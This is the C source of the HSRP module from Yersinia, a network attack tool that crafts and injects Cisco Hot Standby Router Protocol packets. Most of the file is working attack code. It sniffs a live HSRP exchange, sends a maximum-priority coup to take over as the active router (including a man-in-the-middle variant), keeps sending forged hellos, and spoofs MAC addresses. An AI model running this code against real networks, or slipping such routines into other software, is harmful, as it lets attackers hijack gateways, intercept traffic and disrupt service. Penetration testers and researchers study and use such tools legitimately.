/* hsrp.c
 * Implementation and attacks for Cisco Hot Standby Router Protocol
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

/* HSRP functions - please read RFC 2281 before complaining!!! */

#ifndef lint
static const char rcsid[] = 
       "$Id: hsrp.c 46 2007-05-08 09:13:30Z slay $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "hsrp.h"


void
hsrp_register(void)
{
   protocol_register(PROTO_HSRP, "HSRP", "Hot Standby Router Protocol", 
         "hsrp", sizeof(struct hsrp_data), hsrp_init_attribs, NULL,
         hsrp_get_printable_packet, hsrp_get_printable_store,
         hsrp_load_values, hsrp_attack, 
         hsrp_update_field, 
         hsrp_features, hsrp_comm_params, SIZE_ARRAY(hsrp_comm_params), 
         NULL, 0, NULL, hsrp_init_comms_struct, PROTO_VISIBLE, hsrp_end);
}

/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente como esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
hsrp_init_comms_struct(struct term_node *node)
{
    struct hsrp_data *hsrp_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(hsrp_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("hsrp_init_commands_struct calloc error",errno);
       return -1;
    }

    hsrp_data = node->protocol[PROTO_HSRP].tmp_data;
    
    node->protocol[PROTO_HSRP].commands_param = comm_param;

    comm_param[HSRP_SMAC] = &hsrp_data->mac_source;
    comm_param[HSRP_DMAC] = &hsrp_data->mac_dest; 
    comm_param[HSRP_SIP] = &hsrp_data->sip;
    comm_param[HSRP_DIP] = &hsrp_data->dip;
    comm_param[HSRP_SPORT] = &hsrp_data->sport;
    comm_param[HSRP_DPORT] = &hsrp_data->dport;
    comm_param[HSRP_VER] = &hsrp_data->version;
    comm_param[HSRP_OPCODE] = &hsrp_data->opcode;
    comm_param[HSRP_STATE] = &hsrp_data->state;
    comm_param[HSRP_HELLO_TIME] = &hsrp_data->hello_time;
    comm_param[HSRP_HOLD_TIME] = &hsrp_data->hold_time;
    comm_param[HSRP_PRIORITY] = &hsrp_data->priority;
    comm_param[HSRP_GROUP] = &hsrp_data->group;
    comm_param[HSRP_RESERVED] = &hsrp_data->reserved;
    comm_param[HSRP_AUTHDATA] = &hsrp_data->authdata;
    comm_param[HSRP_VIRTUALIP] = &hsrp_data->virtual_ip;
    comm_param[16] = NULL; 
    comm_param[17] = NULL; 

    return 0;
}


void
hsrp_th_send_raw(void *arg)
{
    struct attacks *attacks=NULL;
    struct hsrp_data *hsrp_data;
    sigset_t mask;
    u_int32_t lbl32;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("hsrp_send_discover pthread_sigmask()",errno);
       hsrp_th_send_raw_exit(attacks);    
    }

    hsrp_data = attacks->data;

    /* libnet fix */
    lbl32 = htonl(hsrp_data->sip);
    memcpy((void *)&hsrp_data->sip, &lbl32, 4);

    lbl32 = htonl(hsrp_data->dip);
    memcpy((void *)&hsrp_data->dip, &lbl32, 4);

    hsrp_send_packet(attacks);

    hsrp_th_send_raw_exit(attacks);
}

void
hsrp_th_send_raw_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}


void
hsrp_th_become_active(void *arg)
{
   struct pcap_pkthdr header;
   struct pcap_data pcap_aux;
   struct attacks *attacks=NULL;
   struct hsrp_data *hsrp_data;
   struct timeval now;
   sigset_t mask;
   struct attack_param *param=NULL;
   u_int32_t lbl32;
   dlist_t *p;
   struct interface_data *iface_data;

   attacks = arg;

   pthread_mutex_lock(&attacks->attack_th.finished);

   pthread_detach(pthread_self());

   sigfillset(&mask);

   if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
   {
      thread_error("hsrp_send_discover pthread_sigmask()",errno);
      hsrp_th_become_active_exit(attacks);    
   }

   hsrp_data = attacks->data;

   param = attacks->params;

   gettimeofday(&now,NULL);

   header.ts.tv_sec = now.tv_sec;
   header.ts.tv_usec = now.tv_usec;

   if (hsrp_learn_packet(attacks, NULL, &attacks->attack_th.stop, attacks->data,&header, &pcap_aux) < 0)
      hsrp_th_become_active_exit(attacks);

   hsrp_data->opcode = HSRP_TYPE_COUP;
   hsrp_data->state = HSRP_STATE_SPEAK;

   if (attacks->attack == HSRP_ATTACK_BECOME_ACTIVE)
   {
      memcpy((void *)&hsrp_data->sip, (void *)param[HSRP_SOURCE_IP].value, 4);
   }
   else 
      if (attacks->attack == HSRP_ATTACK_MITM_BECOME_ACTIVE) {
         /* Get interface's ip address */
         p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, pcap_aux.iface);
         iface_data = (struct interface_data *) dlist_data(p);
         hsrp_data->sip = ntohl(inet_addr(iface_data->ipaddr));

         /* libnet fix */
         lbl32 = ntohl(hsrp_data->sip);
         memcpy((void *)&hsrp_data->sip, &lbl32, 4);
      }

   /* libnet fix */
   hsrp_data->dip = inet_addr("224.0.0.2");
   /* Max priority */
   hsrp_data->priority = 0xFF;

   hsrp_send_packet(attacks);

   hsrp_data->opcode = HSRP_TYPE_HELLO;
   hsrp_data->state = HSRP_STATE_ACTIVE;

   thread_create(&attacks->helper_th.id, &hsrp_send_hellos, attacks);

   while (!attacks->attack_th.stop)
      thread_usleep(200000);

   hsrp_th_become_active_exit(attacks);
}


void
hsrp_th_become_active_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}


void
hsrp_send_hellos(void *arg)
{
    u_int32_t ret;
    u_int16_t secs;
    struct timeval hello;
    struct attacks *attacks;
    struct hsrp_data *hsrp_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->helper_th.finished);

    pthread_detach(pthread_self());

    hello.tv_sec  = 0;
    hello.tv_usec = 0;

    hsrp_data = attacks->data;

    secs = 0;
    
write_log(0,"\n hsrp_helper: %d started...\n",(int)pthread_self());
        
    while(!attacks->helper_th.stop)
    {
        if ( (ret=select( 0, NULL, NULL, NULL, &hello ) ) == -1 )
              break;

        if ( !ret )  /* Timeout... */
        {
            if (secs == hsrp_data->hello_time) /* Send HSRP hello...*/
            {
               hsrp_send_packet(attacks);
               secs=0;
            }
            else
               secs++;
        }
        hello.tv_sec  = 1;
        hello.tv_usec = 0;
    } 

write_log(0," hsrp_helper: %d finished...\n",(int)pthread_self());

    pthread_mutex_unlock(&attacks->helper_th.finished);
     
    pthread_exit(NULL);
}

int8_t
hsrp_send_packet(struct attacks *attacks)
{
   libnet_ptag_t t;
   int sent;
   u_int16_t len;
   struct hsrp_data *hsrp_data;
   u_int8_t *hsrp_packet, *aux;
   libnet_t *lhandler;
   dlist_t *p;
   struct interface_data *iface_data;
   struct interface_data *iface_data2;

   hsrp_data = attacks->data;
   hsrp_packet = calloc(1, HSRP_PACKET_SIZE);

   aux = hsrp_packet;
   *aux = hsrp_data->version; aux++;
   *aux = hsrp_data->opcode; aux++;
   *aux = hsrp_data->state; aux++;
   *aux = hsrp_data->hello_time; aux++;
   *aux = hsrp_data->hold_time; aux++;
   *aux = hsrp_data->priority; aux++;
   *aux = hsrp_data->group; aux++;
   *aux = hsrp_data->reserved; aux++;

   len = strlen(hsrp_data->authdata);
   memcpy((void *)aux, (void *)hsrp_data->authdata, (len < HSRP_AUTHDATA_LENGTH) ? len : HSRP_AUTHDATA_LENGTH);
   /*    aux += (len < HSRP_AUTHDATA_LENGTH) ? len : HSRP_AUTHDATA_LENGTH;*/
   aux += 8;

   (*(u_int32_t *)aux) = (u_int32_t) htonl(hsrp_data->virtual_ip);

   for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
      iface_data = (struct interface_data *) dlist_data(p);
      lhandler = iface_data->libnet_handler;

      t = libnet_build_udp(
            hsrp_data->sport,                               /* source port */
            hsrp_data->dport,                               /* destination port */
            LIBNET_UDP_H + HSRP_PACKET_SIZE,                /* packet size */
            0,                                              /* checksum */
            hsrp_packet,                                    /* payload */
            HSRP_PACKET_SIZE,                               /* payload size */
            lhandler,                                       /* libnet handle */
            0);                                             /* libnet id */

      if (t == -1) 
      {
         thread_libnet_error( "Can't build udp datagram",lhandler);
         libnet_clear_packet(lhandler);
         return -1;
      }  

      t = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_UDP_H + HSRP_PACKET_SIZE,/* length */
            0x10,                                           /* TOS */
            0,                                              /* IP ID */
            0,                                              /* IP Frag */
            1,                                              /* TTL */
            IPPROTO_UDP,                                    /* protocol */
            0,                                              /* checksum */
            hsrp_data->sip,                                 /* src ip */
            hsrp_data->dip,                                 /* destination ip */
            NULL,                                           /* payload */
            0,                                              /* payload size */
            lhandler,                                       /* libnet handle */
            0);                                             /* libnet id */

      if (t == -1) 
      {
         thread_libnet_error("Can't build ipv4 packet",lhandler);
         libnet_clear_packet(lhandler);
         return -1;
      }  

      t = libnet_build_ethernet(
            hsrp_data->mac_dest,                /* ethernet destination */
            (attacks->mac_spoofing) ? hsrp_data->mac_source : iface_data->etheraddr,
            /* ethernet source */
            ETHERTYPE_IP,
            NULL,                               /* payload */
            0,                                  /* payload size */
            lhandler,                           /* libnet handle */
            0);                                 /* libnet id */

      if (t == -1)
      {
         thread_libnet_error("Can't build ethernet header",lhandler);
         libnet_clear_packet(lhandler);
         return -1;
      }

      /*
       *  Write it to the wire.
       */
      sent = libnet_write(lhandler);

      if (sent == -1) {
         thread_libnet_error("libnet_write error", lhandler);
         libnet_clear_packet(lhandler);
         return -1;
      }

      libnet_clear_packet(lhandler);
      protocols[PROTO_HSRP].packets_out++;
      iface_data2 = interfaces_get_struct(iface_data->ifname);
      iface_data2->packets_out[PROTO_HSRP]++;
   }

   free(hsrp_packet);

   return 0;
}


/*
 *
 */
int8_t
hsrp_learn_packet(struct attacks *attacks, char *iface, u_int8_t *stop, void *data, struct pcap_pkthdr *header, struct pcap_data *pcap_aux)
{
    struct hsrp_data *hsrp_data;
    u_int8_t got_hsrp_packet = 0;
    u_int8_t *packet;
    dlist_t *p;
    struct interface_data *iface_data;
    
    hsrp_data = data;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;

    if (iface) {
       p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, iface);
       if (!p)
          return -1;

       iface_data = (struct interface_data *) dlist_data(p);
    } else {
       iface_data = NULL;
    }

    while (!got_hsrp_packet && !(*stop))
    {
        interfaces_get_packet(attacks->used_ints, iface_data, stop, header, packet, PROTO_HSRP, NO_TIMEOUT);

        if (*stop)
        {
            free(packet);
            return -1;
        }

        pcap_aux->header = header;
        pcap_aux->packet = packet;

        if (!hsrp_load_values((struct pcap_data *)pcap_aux, hsrp_data))
            got_hsrp_packet = 1;

    } /* While got */

    free(packet);

    return 0;
}

    
int8_t
hsrp_load_values(struct pcap_data *data, void *values)
{
    struct libnet_ethernet_hdr *ether;
    struct hsrp_data *hsrp;
    u_char *hsrp_data, *ip_data, *udp_data;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif

    hsrp = (struct hsrp_data *)values;
    ether = (struct libnet_ethernet_hdr *) data->packet;
    ip_data = (u_char *) (data->packet + LIBNET_ETH_H);
    udp_data = (data->packet + LIBNET_ETH_H + (((*(data->packet + LIBNET_ETH_H))&0x0F)*4));
    hsrp_data = udp_data + LIBNET_UDP_H;

    /* Source MAC */
    memcpy(hsrp->mac_source, ether->ether_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(hsrp->mac_dest, ether->ether_dhost, ETHER_ADDR_LEN);

    /* Source IP */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long,(ip_data+12),4);
    hsrp->sip = ntohl(aux_long);
#else
    hsrp->sip = ntohl(*(u_int32_t *)(ip_data+12));
#endif
    /* Destination IP */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long,(ip_data+16),4);
    hsrp->dip = ntohl(aux_long);
#else
    hsrp->dip = ntohl(*(u_int32_t *)(ip_data+16));
#endif

    /* Source port */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, udp_data, 2);
    hsrp->sport = ntohs(aux_short);
#else
    hsrp->sport = ntohs(*(u_int16_t *)udp_data);
#endif
    /* Destination port */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, udp_data+2, 2);
    hsrp->dport = ntohs(aux_short);
#else
    hsrp->dport = ntohs(*(u_int16_t *)(udp_data+2));
#endif

    /* Version */
    hsrp->version = *((u_char *)hsrp_data);
    /* Opcode */
    hsrp->opcode = *((u_char *)hsrp_data+1);
    /* State */
    hsrp->state = *((u_char *)hsrp_data+2);
    /* Hello time */
    hsrp->hello_time = *((u_char *)hsrp_data+3);
    /* Hold time */
    hsrp->hold_time = *((u_char *)hsrp_data+4);
    /* Priority */
    hsrp->priority = *((u_char *)hsrp_data+5);
    /* Group */
    hsrp->group = *((u_char *)hsrp_data+6);
    /* Reserved */
    hsrp->reserved = *((u_char *)hsrp_data+7);

    /* Authdata */
    memcpy(hsrp->authdata, (hsrp_data+8), HSRP_AUTHDATA_LENGTH);

    /* virtual ip */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long,(hsrp_data+16),4);
    hsrp->virtual_ip = ntohl(aux_long);
#else
    hsrp->virtual_ip = ntohl(*(u_int32_t *)(hsrp_data+16));
#endif

    return 0;
}

int8_t
hsrp_init_attribs(struct term_node *node)
{
    struct hsrp_data *hsrp_data;
    u_int32_t lbl32;

    hsrp_data = node->protocol[PROTO_HSRP].tmp_data;
    
    /* HSRP stuff */
    hsrp_data->version = HSRP_DFL_VERSION;
    hsrp_data->opcode  = HSRP_DFL_TYPE;
    hsrp_data->state   = HSRP_DFL_STATE;
    hsrp_data->hello_time = HSRP_DFL_HELLO_TIME;
    hsrp_data->hold_time  = HSRP_DFL_HOLD_TIME;
    hsrp_data->priority   = HSRP_DFL_PRIORITY;
    hsrp_data->group    = HSRP_DFL_GROUP;
    hsrp_data->reserved = HSRP_DFL_RESERVED;

    memcpy((void *)hsrp_data->authdata, (void *) HSRP_DFL_AUTHDATA, HSRP_AUTHDATA_LENGTH);

    lbl32 = libnet_get_prand(LIBNET_PRu32);

    memcpy((void *)&hsrp_data->virtual_ip, (void *) &lbl32, 4);

    hsrp_data->sport = HSRP_DFL_PORT;
    hsrp_data->dport = HSRP_DFL_PORT;

    lbl32 = libnet_get_prand(LIBNET_PRu32);

    memcpy((void *)&hsrp_data->sip, (void *)&lbl32, sizeof(u_int32_t));

    hsrp_data->dip = ntohl(inet_addr("224.0.0.2"));

    attack_gen_mac(hsrp_data->mac_source);

    hsrp_data->mac_source[0] &= 0x0E; 

    parser_vrfy_mac("01:00:5e:00:00:02",hsrp_data->mac_dest);

    return 0;

}

/* 
 * Return formated strings of each HSRP field
 */
char **
hsrp_get_printable_packet(struct pcap_data *data)
{
    struct libnet_ethernet_hdr *ether;
    char *hsrp_data, *udp_data, *ip_data;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
    u_int32_t aux_long;
#endif
    char **field_values;

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_HSRP].nparams, protocols[PROTO_HSRP].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    ether = (struct libnet_ethernet_hdr *) data->packet;
    ip_data = (char *) (data->packet + LIBNET_ETH_H);
    udp_data = (char *) (data->packet + LIBNET_ETH_H + (((*(data->packet + LIBNET_ETH_H))&0x0F)*4));
    hsrp_data = udp_data + LIBNET_UDP_H;

    /* Source MAC */
    snprintf(field_values[HSRP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    ether->ether_shost[0], ether->ether_shost[1], ether->ether_shost[2],
	    ether->ether_shost[3], ether->ether_shost[4], ether->ether_shost[5]);
    /* Destination MAC */
    snprintf(field_values[HSRP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    ether->ether_dhost[0], ether->ether_dhost[1], ether->ether_dhost[2],
	    ether->ether_dhost[3], ether->ether_dhost[4], ether->ether_dhost[5]);

    /* Source IP */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, (ip_data+12), 4);
    strncpy(field_values[HSRP_SIP], libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE), 16);
#else
    strncpy(field_values[HSRP_SIP], libnet_addr2name4((*(u_int32_t *)(ip_data + 12)) , LIBNET_DONT_RESOLVE), 16);
#endif

    /* Destination IP */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, (ip_data+16), 4);
    strncpy(field_values[HSRP_DIP], libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE), 16);
#else
    strncpy(field_values[HSRP_DIP], libnet_addr2name4((*(u_int32_t *)(ip_data + 16)), LIBNET_DONT_RESOLVE), 16);
#endif

    /* Source port */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, udp_data, 2);
    snprintf(field_values[HSRP_SPORT], 6, "%d", ntohs(aux_short));
#else
    snprintf(field_values[HSRP_SPORT], 6, "%d", ntohs(*(u_int16_t *)udp_data));
#endif

    /* Destination port */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, udp_data+2, 2);
    snprintf(field_values[HSRP_DPORT], 6, "%d", ntohs(aux_short));
#else
    snprintf(field_values[HSRP_DPORT], 6, "%d", ntohs(*(u_int16_t *)(udp_data+2)));
#endif

    /* Version */
    snprintf(field_values[HSRP_VER], 3, "%02X", *((u_char *)hsrp_data));
    /* Opcode */
    snprintf(field_values[HSRP_OPCODE], 3, "%02X", *((u_char *)hsrp_data+1));
    /* State */
    snprintf(field_values[HSRP_STATE], 3, "%02X", *((u_char *)hsrp_data+2));
    /* Hello time */
    snprintf(field_values[HSRP_HELLO_TIME], 3, "%02X", *((u_char *)hsrp_data+3));
    /* Hold time */
    snprintf(field_values[HSRP_HOLD_TIME], 3, "%02X", *((u_char *)hsrp_data+4));
    /* Priority */
    snprintf(field_values[HSRP_PRIORITY], 3, "%02X", *((u_char *)hsrp_data+5));
    /* Group */
    snprintf(field_values[HSRP_GROUP], 3, "%02X", *((u_char *)hsrp_data+6));
    /* Reserved */
    snprintf(field_values[HSRP_RESERVED], 3, "%02X", *((u_char *)hsrp_data+7));

    /* Authdata */
    strncpy(field_values[HSRP_AUTHDATA], (hsrp_data+8), HSRP_AUTHDATA_LENGTH);

    /* Virtual ip */
#ifdef LBL_ALIGN
    memcpy((void *)&aux_long, (hsrp_data+16), 4);
    strncpy(field_values[HSRP_VIRTUALIP], libnet_addr2name4(aux_long, LIBNET_DONT_RESOLVE),16);
#else
    strncpy(field_values[HSRP_VIRTUALIP], libnet_addr2name4((*(u_int32_t *)(hsrp_data + 16)), LIBNET_DONT_RESOLVE), 16);
#endif
    
    return (char **)field_values;
}


char **
hsrp_get_printable_store(struct term_node *node)
{
    struct hsrp_data *hsrp;
    char **field_values;

    /* smac + dmac + sip + dip + sport + dport + ver + opcode + state + hello +
     * hold + priority + group + reserved + auth + vip + null = 17
     */

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_HSRP].nparams, protocols[PROTO_HSRP].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

	if (node == NULL)
		hsrp = protocols[PROTO_HSRP].default_values;
	else
        hsrp = (struct hsrp_data *) node->protocol[PROTO_HSRP].tmp_data;

    /* Source MAC */
    snprintf(field_values[HSRP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    hsrp->mac_source[0], hsrp->mac_source[1],
	    hsrp->mac_source[2], hsrp->mac_source[3],
	    hsrp->mac_source[4], hsrp->mac_source[5]);
    /* Destination MAC */
    snprintf(field_values[HSRP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    hsrp->mac_dest[0], hsrp->mac_dest[1],
	    hsrp->mac_dest[2], hsrp->mac_dest[3],
	    hsrp->mac_dest[4], hsrp->mac_dest[5]);

    /* Source IP */
    parser_get_formated_inet_address(hsrp->sip , field_values[HSRP_SIP], 16);
    /* Destination IP */
    parser_get_formated_inet_address(hsrp->dip , field_values[HSRP_DIP], 16);

    /* Source port */
    snprintf(field_values[HSRP_SPORT], 6, "%05hd", hsrp->sport);

    /* Destination port */
    snprintf(field_values[HSRP_DPORT], 6, "%05hd", hsrp->dport);

    /* Version */
    snprintf(field_values[HSRP_VER], 3, "%02X", hsrp->version);
    /* Opcode */
    snprintf(field_values[HSRP_OPCODE], 3, "%02X", hsrp->opcode);
    /* State */
    snprintf(field_values[HSRP_STATE], 3, "%02X", hsrp->state);
    /* Hello time */
    snprintf(field_values[HSRP_HELLO_TIME], 3, "%02X", hsrp->hello_time);
    /* Hold time */
    snprintf(field_values[HSRP_HOLD_TIME], 3, "%02X", hsrp->hold_time);
    /* Priority */
    snprintf(field_values[HSRP_PRIORITY], 3, "%02X", hsrp->priority);
    /* Group */
    snprintf(field_values[HSRP_GROUP], 3, "%02X", hsrp->group);
    /* Reserved */
    snprintf(field_values[HSRP_RESERVED], 3, "%02X", hsrp->reserved);
    /* Auth data */
    strncpy(field_values[HSRP_AUTHDATA], hsrp->authdata, 8);
    /* Virtual IP */
    parser_get_formated_inet_address(hsrp->virtual_ip , field_values[HSRP_VIRTUALIP], 16);

    return (char **)field_values;
}


int8_t 
hsrp_update_field(int8_t state, struct term_node *node, void *value)
{
    struct hsrp_data *hsrp_data;
	u_int8_t len;
    
	if (node == NULL)
		hsrp_data = protocols[PROTO_HSRP].default_values;
	else
        hsrp_data = node->protocol[PROTO_HSRP].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case HSRP_SMAC:
            memcpy((void *)hsrp_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;
        /* Destination MAC */
        case HSRP_DMAC:
            memcpy((void *)hsrp_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;
        /* Version */
        case HSRP_VER:
            hsrp_data->version = *(u_int8_t *)value;
        break;
        /* Op */
        case HSRP_OPCODE:
            hsrp_data->opcode = *(u_int8_t *)value;
        break;
        /* State */
        case HSRP_STATE:
            hsrp_data->state = *(u_int8_t *)value;
        break;
        /* Hello time */
  	    case HSRP_HELLO_TIME:
	        hsrp_data->hello_time = *(u_int8_t *)value;
        break;
        /* Hold time */
  	    case HSRP_HOLD_TIME:
	        hsrp_data->hold_time = *(u_int8_t *)value;
        break;
        /* Priority */
  	    case HSRP_PRIORITY:
	        hsrp_data->priority = *(u_int8_t *)value;
        break;
        /* Group */
  	    case HSRP_GROUP:
	        hsrp_data->group = *(u_int8_t *)value;
        break;
        /* Reserved */
  	    case HSRP_RESERVED:
	        hsrp_data->reserved = *(u_int8_t *)value;
        break;
		/* Authdata */
       	case HSRP_AUTHDATA:
       	    len = strlen(value);
       	    strncpy(hsrp_data->authdata, value, (len > HSRP_AUTHDATA_LENGTH) ? HSRP_AUTHDATA : len);
       	break;
       	/* Virtual IP */
       	case HSRP_VIRTUALIP:
       	    hsrp_data->virtual_ip = *(u_int32_t *)value;
       	break;
        /* SPort */
       	case HSRP_SPORT:
            hsrp_data->sport = *(u_int16_t *)value;
        break;
        /* DPort */
        case HSRP_DPORT:
            hsrp_data->dport = *(u_int16_t *)value;
        break;
      	/* Source IP */
      	case HSRP_SIP:
      	    hsrp_data->sip = *(u_int32_t *)value;
       	break;
		/* Destination IP */
       	case HSRP_DIP:
       	    hsrp_data->dip = *(u_int32_t *)value;
       	break;
       
       	default:
       	break;
    }

    return 0;
}




int8_t
hsrp_end(struct term_node *node)
{
   return 0;
}
